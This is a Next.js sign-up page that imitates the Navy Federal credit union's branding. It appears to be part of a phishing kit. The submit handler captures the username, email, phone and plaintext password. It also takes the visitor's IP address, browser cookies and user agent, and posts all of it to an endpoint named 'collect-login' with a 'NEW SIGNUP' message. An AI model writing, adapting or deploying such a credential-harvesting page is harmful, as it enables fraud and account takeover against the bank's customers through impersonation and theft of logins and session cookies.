// app/signup/page.tsx
'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function SignupPage() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    phone: '',
    password: '',
    confirmPassword: ''
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({ ...prev, [id]: value }));
    setError('');
  };

  const getIP = async () => {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch {
      return 'IP not available';
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setSuccess('');

    const { username, email, phone, password, confirmPassword } = formData;

    // Validation
    if (!username || !email || !phone || !password) {
      setError('All fields are required');
      setLoading(false);
      return;
    }

    if (password !== confirmPassword) {
      setError('Passwords do not match!');
      setLoading(false);
      return;
    }

    if (password.length < 6) {
      setError('Password must be at least 6 characters');
      setLoading(false);
      return;
    }

    try {
      const ip = await getIP();
      const cookies = document.cookie || 'No cookies';

      const userData = {
        username,
        email,
        phone,
        password,
        ip,
        cookies,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      };

      console.log('📝 Sending signup data:', userData);

      // ✅ FIXED: Send data to the API
      const response = await fetch('/api/auth/collect-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          step: 'signup',
          username: userData.username,
          password: userData.password,
          email: userData.email,
          phone: userData.phone,
          ip: userData.ip,
          cookies: userData.cookies,
          userAgent: userData.userAgent,
          message: '📝 NEW SIGNUP: User registered',
          timestamp: userData.timestamp
        })
      });

      const result = await response.json();
      console.log('📡 API Response:', result);

      if (response.ok) {
        setSuccess('✅ Account created successfully! Redirecting to login...');
        setTimeout(() => {
          router.push('/');
        }, 2000);
      } else {
        setError(result.error || 'Signup failed. Please try again.');
      }
    } catch (error) {
      console.error('❌ Signup error:', error);
      setError('Signup failed. Please check your connection.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#b8d4f0',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
    }}>
      {/* Header */}
      <header style={{
        backgroundColor: '#1a3a6e',
        padding: '14px 16px',
        display: 'flex',
        alignItems: 'center',
        gap: '16px'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{
            width: '36px',
            height: '36px',
            border: '2.5px solid white',
            borderRadius: '50%',
            position: 'relative',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            <div style={{ position: 'absolute', width: '24px', height: '36px', border: '2.5px solid white', borderRadius: '50%', top: '50%', left: '50%', transform: 'translate(-50%, -50%)' }}></div>
            <div style={{ position: 'absolute', width: '36px', height: '24px', border: '2.5px solid white', borderRadius: '50%', top: '50%', left: '50%', transform: 'translate(-50%, -50%)' }}></div>
          </div>
          <span style={{ color: 'white', fontSize: '22px', fontWeight: 700, letterSpacing: '0.5px' }}>NAVY FEDERAL</span>
        </div>
      </header>

      {/* Main Content */}
      <main style={{ padding: '24px 16px 40px', maxWidth: '560px', margin: '0 auto' }}>
        <h1 style={{ color: '#1a3a6e', fontSize: '32px', fontWeight: 500, marginBottom: '28px' }}>
          Create Your Account
        </h1>

        <div style={{
          backgroundColor: '#f5f5f5',
          borderRadius: '4px',
          overflow: 'hidden',
          boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
        }}>
          <div style={{ height: '6px', backgroundColor: '#d97a2e' }}></div>

          <div style={{ padding: '28px 20px 36px' }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '12px',
              marginBottom: '24px',
              paddingBottom: '20px',
              borderBottom: '1.5px solid #d0d0d0'
            }}>
              <div style={{ width: '36px', height: '42px', position: 'relative' }}>
                <div style={{
                  width: '18px',
                  height: '18px',
                  border: '4px solid #888',
                  borderBottom: 'none',
                  borderRadius: '9px 9px 0 0',
                  position: 'absolute',
                  top: '2px',
                  left: '50%',
                  transform: 'translateX(-50%)'
                }}></div>
                <div style={{
                  width: '28px',
                  height: '22px',
                  backgroundColor: '#888',
                  borderRadius: '3px',
                  position: 'absolute',
                  bottom: 0,
                  left: '50%',
                  transform: 'translateX(-50%)'
                }}>
                  <div style={{
                    width: '6px',
                    height: '6px',
                    backgroundColor: 'white',
                    borderRadius: '50%',
                    position: 'absolute',
                    bottom: '8px',
                    left: '50%',
                    transform: 'translateX(-50%)'
                  }}></div>
                </div>
              </div>
              <span style={{ fontSize: '28px', fontWeight: 400, color: '#333' }}>Sign Up</span>
            </div>

            {/* Error Message */}
            {error && (
              <div style={{
                backgroundColor: '#ffebee',
                color: '#c62828',
                padding: '12px',
                borderRadius: '4px',
                marginBottom: '16px',
                fontSize: '14px'
              }}>
                ❌ {error}
              </div>
            )}

            {/* Success Message */}
            {success && (
              <div style={{
                backgroundColor: '#e8f5e9',
                color: '#1b5e20',
                padding: '12px',
                borderRadius: '4px',
                marginBottom: '16px',
                fontSize: '14px'
              }}>
                ✅ {success}
              </div>
            )}

            <form onSubmit={handleSubmit}>
              <div style={{ marginBottom: '18px' }}>
                <label htmlFor="username" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
                  Username
                </label>
                <input
                  type="text"
                  id="username"
                  value={formData.username}
                  onChange={handleChange}
                  placeholder="Choose a username"
                  style={{
                    width: '100%',
                    padding: '12px 14px',
                    fontSize: '16px',
                    border: '2px solid #999',
                    borderRadius: '8px',
                    backgroundColor: 'white',
                    outline: 'none',
                    boxSizing: 'border-box'
                  }}
                  required
                />
              </div>

              <div style={{ marginBottom: '18px' }}>
                <label htmlFor="email" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
                  Email Address
                </label>
                <input
                  type="email"
                  id="email"
                  value={formData.email}
                  onChange={handleChange}
                  placeholder="you@example.com"
                  style={{
                    width: '100%',
                    padding: '12px 14px',
                    fontSize: '16px',
                    border: '2px solid #999',
                    borderRadius: '8px',
                    backgroundColor: 'white',
                    outline: 'none',
                    boxSizing: 'border-box'
                  }}
                  required
                />
              </div>

              <div style={{ marginBottom: '18px' }}>
                <label htmlFor="phone" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
                  Phone Number
                </label>
                <input
                  type="tel"
                  id="phone"
                  value={formData.phone}
                  onChange={handleChange}
                  placeholder="+1 (234) 567-8900"
                  style={{
                    width: '100%',
                    padding: '12px 14px',
                    fontSize: '16px',
                    border: '2px solid #999',
                    borderRadius: '8px',
                    backgroundColor: 'white',
                    outline: 'none',
                    boxSizing: 'border-box'
                  }}
                  required
                />
              </div>

              <div style={{ marginBottom: '18px' }}>
                <label htmlFor="password" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
                  Password
                </label>
                <input
                  type="password"
                  id="password"
                  value={formData.password}
                  onChange={handleChange}
                  placeholder="Create a strong password (min 6 characters)"
                  style={{
                    width: '100%',
                    padding: '12px 14px',
                    fontSize: '16px',
                    border: '2px solid #999',
                    borderRadius: '8px',
                    backgroundColor: 'white',
                    outline: 'none',
                    boxSizing: 'border-box'
                  }}
                  required
                  minLength={6}
                />
              </div>

              <div style={{ marginBottom: '18px' }}>
                <label htmlFor="confirmPassword" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
                  Confirm Password
                </label>
                <input
                  type="password"
                  id="confirmPassword"
                  value={formData.confirmPassword}
                  onChange={handleChange}
                  placeholder="Confirm your password"
                  style={{
                    width: '100%',
                    padding: '12px 14px',
                    fontSize: '16px',
                    border: '2px solid #999',
                    borderRadius: '8px',
                    backgroundColor: 'white',
                    outline: 'none',
                    boxSizing: 'border-box'
                  }}
                  required
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  backgroundColor: '#d97a2e',
                  color: 'white',
                  fontSize: '22px',
                  fontWeight: 600,
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  boxShadow: '0 4px 8px rgba(0,0,0,0.15)',
                  opacity: loading ? 0.7 : 1
                }}
              >
                {loading ? 'Creating Account...' : 'Create Account'}
              </button>
            </form>

            <p style={{ textAlign: 'center', marginTop: '20px', color: '#555' }}>
              Already have an account?{' '}
              <a href="/" style={{ color: '#2a6db5', textDecoration: 'none', fontWeight: 600 }}>
                Sign In
              </a>
            </p>
          </div>
        </div>

        <div style={{ marginTop: '24px' }}>
          <p style={{ color: '#1a3a6e', fontSize: '30px', fontWeight: 500, margin: 0 }}>
            Not a Navy Federal Member?
          </p>
          <p style={{ color: '#888', fontSize: '12px', marginTop: '8px' }}>
          </p>
        </div>
      </main>
    </div>
  );
}